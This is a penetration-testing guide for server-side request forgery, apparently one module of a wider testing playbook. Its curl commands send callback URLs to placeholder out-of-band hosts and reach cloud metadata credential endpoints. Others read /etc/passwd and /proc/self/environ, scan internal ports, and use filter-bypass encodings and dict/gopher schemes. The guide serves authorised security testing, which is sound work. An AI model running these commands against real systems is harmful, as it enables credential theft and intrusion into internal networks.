# Server-Side Request Forgery (SSRF) Testing

## Objective

Identify endpoints that make server-side HTTP requests to attacker-controlled or internal URLs, allowing access to internal services, cloud metadata, or other restricted resources.

---

## 1. Identify SSRF Entry Points

Look for any parameter that takes a URL, hostname, IP, or path that may be used to make a server-side request:

| Parameter Type | Examples |
|---|---|
| URL parameter | `?url=`, `?link=`, `?src=`, `?href=`, `?redirect=` |
| Webhook | `?webhook_url=`, `?callback=`, `?notify_url=` |
| File fetch | `?file=`, `?path=`, `?resource=` |
| Image import | `?image_url=`, `?avatar=`, `?icon=` |
| PDF/HTML export | Renders URLs from user input |
| XML import | External entities (see XXE module) |
| Integrations | Slack/GitHub webhooks, SMTP host, Jira URL |

---

## 2. External Interaction Confirmation

### Step 1 — Setup Out-of-Band Receiver
Use an interaction logger to detect blind SSRF:
```
Burp Collaborator: https://YOUR_BURP_COLLABORATOR_SUBDOMAIN.burpcollaborator.net
interactsh: https://YOUR_ID.interact.sh
```

### Step 2 — Inject Callback URL
```bash
COLLAB="YOUR_COLLAB_SUBDOMAIN.burpcollaborator.net"

# Test via URL parameter
curl -si "https://target/fetch?url=http://$COLLAB/ssrf-test" | grep HTTP

# Test via JSON body
curl -si -X POST https://target/api/webhook \
  -H "Content-Type: application/json" \
  -d "{\"webhook_url\":\"http://$COLLAB/ssrf-test\"}" | grep HTTP

# Test via XML
curl -si -X POST https://target/api/import \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><url>http://$COLLAB/ssrf-test</url>" | grep HTTP
```

**If the collaborator receives a DNS lookup or HTTP request → SSRF confirmed.**

---

## 3. Internal Network Enumeration (Post-Confirmation)

> **Rules:** Only probe internal ranges after SSRF is confirmed. Do not probe infrastructure beyond what is needed to demonstrate impact. Limit to 5-10 probes.

### Cloud Metadata — AWS (IMDS)
```bash
# IMDSv1 (no auth required — vulnerable if accessible)
curl -si "https://target/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -si "https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# IMDSv1 via alternative encodings
curl -si "https://target/fetch?url=http://169.254.169.254"
curl -si "https://target/fetch?url=http://[::ffff:169.254.169.254]"
curl -si "https://target/fetch?url=http://0xA9FEA9FE"   # hex
curl -si "https://target/fetch?url=http://2852039166"    # decimal
```

### Cloud Metadata — GCP
```bash
curl -si "https://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/" \
  --header "Metadata-Flavor: Google"
```

### Cloud Metadata — Azure
```bash
curl -si "https://target/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-01-01" \
  --header "Metadata: true"
```

### Internal Service Detection
```bash
# Common internal ports
for PORT in 80 443 8080 8443 8888 6379 5432 3306 27017 9200 2375; do
  echo "Testing port $PORT"
  curl -si "https://target/fetch?url=http://127.0.0.1:$PORT/" \
    --max-time 3 | grep -E "HTTP|Content-Length|error"
done
```

---

## 4. SSRF Filter Bypass Techniques

If the application blocks direct IP addresses or `localhost`:

```bash
# DNS rebinding/alternative representations
localhost → 127.0.0.1
127.0.0.1 alternatives:
  - 0.0.0.0
  - 127.1
  - 127.0.1
  - [::1]  (IPv6)
  - 0x7f000001 (hex)
  - 2130706433 (decimal)
  - 127.000.000.001 (octal-ish)

# Domain-based bypass
# Register or use DNS that resolves to 127.0.0.1
# e.g., localtest.me → 127.0.0.1

# URL scheme bypass
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO

# Redirect bypass
# Host an HTTP 302 redirect on attacker server to internal IP
curl -si "https://target/fetch?url=http://your-server/redirect-to-internal"
```

---

## 5. Protocol Exploitation

```bash
# File:// — local file read
curl -si "https://target/fetch?url=file:///etc/passwd"
curl -si "https://target/fetch?url=file:///etc/hosts"
curl -si "https://target/fetch?url=file:///proc/self/environ"

# Dict:// — Redis interaction
curl -si "https://target/fetch?url=dict://127.0.0.1:6379/info"

# Gopher:// — HTTP request smuggling to internal services
# (Only test if explicitly in scope for SSRF impact demonstration)
```

---

## 6. Blind SSRF — Time-Based Confirmation

If no response body is returned, use timing:
```bash
# Measure response time for open port vs closed port
time curl -si "https://target/fetch?url=http://127.0.0.1:80/" --max-time 5
time curl -si "https://target/fetch?url=http://127.0.0.1:9999/" --max-time 5

# Significant difference in response time indicates port state discrimination
```

---

## Evidence to Capture

- The SSRF entry point (endpoint, parameter name)
- The injected URL
- Collaborator/out-of-band proof of request (DNS log or HTTP log)
- For internal access: partial response showing internal data (hostname, service banner)
- Do NOT include full cloud credentials if discovered — note field names only

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Blind SSRF (OOB confirmation) | Pass/Fail | High |
| SSRF reading cloud IMDS | Pass/Fail | Critical |
| SSRF accessing internal services | Pass/Fail | High-Critical |
| SSRF via file:// protocol | Pass/Fail | High |
| SSRF filter bypass | Pass/Fail | High |
